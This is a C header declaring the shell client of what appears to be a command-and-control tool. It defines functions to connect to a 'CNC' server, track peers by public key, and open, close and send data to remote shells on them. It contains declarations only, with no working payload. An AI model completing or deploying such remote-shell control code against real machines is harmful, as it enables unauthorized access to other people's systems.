#ifndef SHELLCLIENT_H
#define SHELLCLIENT_H

#include "hashmap.h"
#include "lmem.h"
#include "lpeer.h"
#include "lsodium.h"
#include "ltask.h"
#include "speer.h"

typedef struct sShell_client
{
    uint8_t priv[crypto_kx_SECRETKEYBYTES], pub[crypto_kx_PUBLICKEYBYTES];
    struct sLaika_pollList pList;
    struct sLaika_taskService tService;
    struct sLaika_peer *peer;
    tShell_peer *openShell; /* if not NULL, shell is open on peer */
    struct hashmap *peers;
    laikaM_newVector(tShell_peer *, peerTbl);
} tShell_client;

#define shellC_isShellOpen(x) (x->openShell != NULL)

void shellC_init(tShell_client *client);
void shellC_cleanup(tShell_client *client);

void shellC_connectToCNC(tShell_client *client, char *ip, char *port);
bool shellC_poll(tShell_client *client, int timeout);

void shellC_loadKeys(tShell_client *client, const char *pub, const char *priv);
tShell_peer *shellC_getPeerByPub(tShell_client *client, uint8_t *pub, int *id);

/* returns new peer id */
int shellC_addPeer(tShell_client *client, tShell_peer *peer);
void shellC_rmvPeer(tShell_client *client, tShell_peer *peer, int id);

void shellC_openShell(tShell_client *client, tShell_peer *peer, uint16_t col, uint16_t row);
void shellC_closeShell(tShell_client *client);
void shellC_sendDataShell(tShell_client *client, uint8_t *data, size_t sz);

#endif